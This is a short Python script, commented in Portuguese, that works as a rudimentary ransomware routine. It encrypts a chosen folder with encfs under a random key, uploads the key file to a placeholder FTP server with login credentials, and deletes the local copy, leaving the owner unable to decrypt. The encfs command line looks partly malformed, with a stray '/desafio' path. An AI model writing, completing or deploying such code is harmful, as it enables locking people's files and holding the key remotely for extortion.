import os
import ftplib

# Caminho da pasta a ser criptografada
path = "What_you_will_encrypt"

# Criar uma chave de criptografia aleatória
key = os.urandom(32)

# Salvar a chave em um arquivo
with open("keyfile.key", "wb") as f:
    f.write(key)

# Criptografar a pasta
os.system("encfs /desafio --standard --extpass='echo {}' {} encrypted".format(key.hex(), path))

# Conexão com o servidor ftp
ftp = ftplib.FTP("servidor_here")
ftp.login("user", "password")

# Enviando o arquivo keyfile.key
with open("keyfile.key", "rb") as f:
    ftp.storbinary("STOR keyfile.key", f)

ftp.quit()

# Delete keyfile.key do disco local
os.remove("keyfile.key")
